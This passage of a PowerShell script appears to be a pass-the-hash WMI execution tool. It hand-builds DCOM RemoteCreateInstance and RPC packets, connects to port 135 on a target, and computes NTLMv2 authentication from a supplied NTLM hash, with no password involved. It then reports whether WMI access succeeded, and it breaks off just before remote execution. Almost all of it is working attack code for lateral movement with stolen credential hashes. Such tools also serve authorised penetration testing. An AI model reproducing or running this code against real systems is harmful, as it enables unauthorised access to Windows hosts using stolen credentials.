    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPrivateHeader",[Byte[]](0x58,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesSessionID",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesRemoteThisSessionID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesClientImpersonating",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionIDPresent",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesDefaultAuthnLevel",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionGuid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesProcessRequestFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesOriginalClassContext",[Byte[]](0x14,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesFlags",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoPrivateHeader",[Byte[]](0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiatedObjectClsId",[Byte[]](0x5e,0xf0,0xc3,0x8b,0x6b,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoClassContext",[Byte[]](0x14,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoActivationFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoFlagsSurrogate",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInterfaceIdCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiationFlag",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtr",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationEntirePropertySize",[Byte[]](0x58,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIds",[Byte[]](0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoPrivateHeader",[Byte[]](0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientOk",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved3",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextUnknown",[Byte[]](0x60,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextCntData",[Byte[]](0x60,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFIID",[Byte[]](0xc0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCLSID",[Byte[]](0x3b,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFSize",[Byte[]](0x30,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoUnusedBuffer",[Byte[]](0x01,0x00,0x01,0x00,0x63,0x2c,0x80,0x2a,0xa5,0xd2,0xaf,0xdd,0x4d,0xc4,0xbb,0x37,0x4d,0x37,0x76,0xd7,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoPrivateHeader",$packet_private_header)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoAuthenticationFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameMaxCount",$packet_target_length)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameActualCount",$packet_target_length)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameString",$packet_target_unicode)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoPrivateHeader",[Byte[]](0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoProcessID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoApartmentID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoPrivateHeader",[Byte[]](0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestClientImpersonationLevel",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestNumProtocolSequences",[Byte[]](0x01,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestUnknown",[Byte[]](0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrProtocolSeq",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_DCOMRemoteCreateInstance
}

function DataLength2
{
    param ([Int]$length_start,[Byte[]]$string_extract_data)

    $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)

    return $string_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

if($Target -eq 'localhost')
{
    $Target = "127.0.0.1"
}

try
{
    $target_type = [IPAddress]$Target
    $target_short = $target_long = $Target
}
catch
{
    $target_long = $Target

    if($Target -like "*.*")
    {
        $target_short_index = $Target.IndexOf(".")
        $target_short = $Target.Substring(0,$target_short_index)
    }
    else
    {
        $target_short = $Target
    }

}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
Write-Verbose "Connecting to $Target`:135"
$WMI_client_init = New-Object System.Net.Sockets.TCPClient
$WMI_client_init.Client.ReceiveTimeout = 30000

try
{
    $WMI_client_init.Connect($Target,"135")
}
catch
{
    Write-Output "$Target did not respond"
}

if($WMI_client_init.Connected)
{
    $WMI_client_stream_init = $WMI_client_init.GetStream()
    $WMI_client_receive = New-Object System.Byte[] 2048
    $RPC_UUID = 0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a
    $packet_RPC = Get-PacketRPCBind 2 0xd0,0x16 0x02 0x00,0x00 $RPC_UUID 0x00,0x00
    $packet_RPC["RPCBind_FragLength"] = 0x74,0x00
    $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
    $WMI_client_send = $RPC
    $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
    $WMI_client_stream_init.Flush()
    $WMI_client_stream_init.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
    $assoc_group = $WMI_client_receive[20..23]
    $packet_RPC = Get-PacketRPCRequest 0x03 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x05,0x00
    $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
    $WMI_client_send = $RPC
    $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
    $WMI_client_stream_init.Flush()
    $WMI_client_stream_init.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
    $WMI_hostname_unicode = $WMI_client_receive[42..$WMI_client_receive.Length]
    $WMI_hostname = [System.BitConverter]::ToString($WMI_hostname_unicode)
    $WMI_hostname_index = $WMI_hostname.IndexOf("-00-00-00")
    $WMI_hostname = $WMI_hostname.SubString(0,$WMI_hostname_index)
    $WMI_hostname = $WMI_hostname -replace "-00",""
    $WMI_hostname = $WMI_hostname.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $WMI_hostname = New-Object System.String ($WMI_hostname,0,$WMI_hostname.Length)

    if($target_short -cne $WMI_hostname)
    {

        $target_short = $WMI_hostname
    }

    $WMI_client_init.Close()
    $WMI_client_stream_init.Close()
    $WMI_client = New-Object System.Net.Sockets.TCPClient
    $WMI_client.Client.ReceiveTimeout = 30000

    try
    {
        $WMI_client.Connect($target_long,"135")
    }
    catch
    {
        Write-Output "$target_long did not respond"
    }

    if($WMI_client.Connected)
    {
        $WMI_client_stream = $WMI_client.GetStream()
        $RPC_UUID = 0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46
        $packet_RPC = Get-PacketRPCBind 3 0xd0,0x16 0x01 0x01,0x00 $RPC_UUID 0x00,0x00
        $packet_RPC["RPCBind_FragLength"] = 0x78,0x00
        $packet_RPC["RPCBind_AuthLength"] = 0x28,0x00
        $packet_RPC["RPCBind_NegotiateFlags"] = 0x07,0x82,0x08,0xa2
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()
        $WMI_client_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
        $assoc_group = $WMI_client_receive[20..23]
        $WMI_NTLMSSP = [System.BitConverter]::ToString($WMI_client_receive)
        $WMI_NTLMSSP = $WMI_NTLMSSP -replace "-",""
        $WMI_NTLMSSP_index = $WMI_NTLMSSP.IndexOf("4E544C4D53535000")
        $WMI_NTLMSSP_bytes_index = $WMI_NTLMSSP_index / 2
        $WMI_domain_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
        $WMI_target_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
        $WMI_session_ID = $WMI_client_receive[44..51]
        $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
        $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
        $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.Length - 12)..($WMI_target_details.Length - 5)]
        $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
        $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $auth_hostname = (get-childitem -path env:computername).Value
        $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
        $auth_domain = $Domain
        $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_domain)
        $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
        $auth_domain_length = $auth_domain_length[0,1]
        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
        $auth_domain_length = $auth_domain_length[0,1]
        $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
        $auth_username_length = $auth_username_length[0,1]
        $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
        $auth_hostname_length = $auth_hostname_length[0,1]
        $auth_domain_offset = 0x40,0x00,0x00,0x00
        $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
        $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
        $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
        $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
        $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
        $HMAC_MD5.key = $NTLM_hash_bytes
        $username_and_target = $username.ToUpper()
        $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
        $username_and_target_bytes += $auth_domain_bytes
        $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
        $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                0x00,0x00,0x00,0x00 +
                                $WMI_target_time_bytes +
                                $client_challenge_bytes +
                                0x00,0x00,0x00,0x00 +
                                $WMI_target_details +
                                0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00

        $server_challenge_and_security_blob_bytes = $WMI_NTLM_challenge + $security_blob_bytes
        $HMAC_MD5.key = $NTLMv2_hash
        $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)
        $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
        $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
        $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
        $NTLMv2_response_length = $NTLMv2_response_length[0,1]
        $WMI_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)
        $WMI_session_key_length = 0x00,0x00
        $WMI_negotiate_flags = 0x15,0x82,0x88,0xa2

        $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                0x03,0x00,0x00,0x00,
                                0x18,0x00,
                                0x18,0x00 +
                                $auth_LM_offset +
                                $NTLMv2_response_length +
                                $NTLMv2_response_length +
                                $auth_NTLM_offset +
                                $auth_domain_length +
                                $auth_domain_length +
                                $auth_domain_offset +
                                $auth_username_length +
                                $auth_username_length +
                                $auth_username_offset +
                                $auth_hostname_length +
                                $auth_hostname_length +
                                $auth_hostname_offset +
                                $WMI_session_key_length +
                                $WMI_session_key_length +
                                $WMI_session_key_offset +
                                $WMI_negotiate_flags +
                                $auth_domain_bytes +
                                $auth_username_bytes +
                                $auth_hostname_bytes +
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                $NTLMv2_response

        $assoc_group = $WMI_client_receive[20..23]
        $packet_RPC = Get-PacketRPCAUTH3 $NTLMSSP_response
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()
        $causality_ID = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        [Byte[]]$causality_ID_bytes = $causality_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $unused_buffer = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        [Byte[]]$unused_buffer_bytes = $unused_buffer.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_DCOM_remote_create_instance = Get-PacketDCOMRemoteCreateInstance $causality_ID_bytes $target_short
        $DCOM_remote_create_instance = ConvertFrom-PacketOrderedDictionary $packet_DCOM_remote_create_instance
        $packet_RPC = Get-PacketRPCRequest 0x03 $DCOM_remote_create_instance.Length 0 0 0x03,0x00,0x00,0x00 0x01,0x00 0x04,0x00
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC + $DCOM_remote_create_instance
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()
        $WMI_client_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null

        if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
        {
            Write-Output "$output_username WMI access denied on $target_long"
        }
        elseif($WMI_client_receive[2] -eq 3)
        {
            $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
            $error_code = $error_code -replace "-",""
            Write-Output "Error code 0x$error_code"
        }
        elseif($WMI_client_receive[2] -eq 2 -and !$WMI_execute)
        {
            Write-Output "$output_username accessed WMI on $target_long"
        }
        elseif($WMI_client_receive[2] -eq 2)
        {

            if($target_short -eq '127.0.0.1')
            {
                $target_short = $auth_hostname
            }

            $target_unicode = 0x07,0x00 + [System.Text.Encoding]::Unicode.GetBytes($target_short + "[")
            $target_search = [System.BitConverter]::ToString($target_unicode)
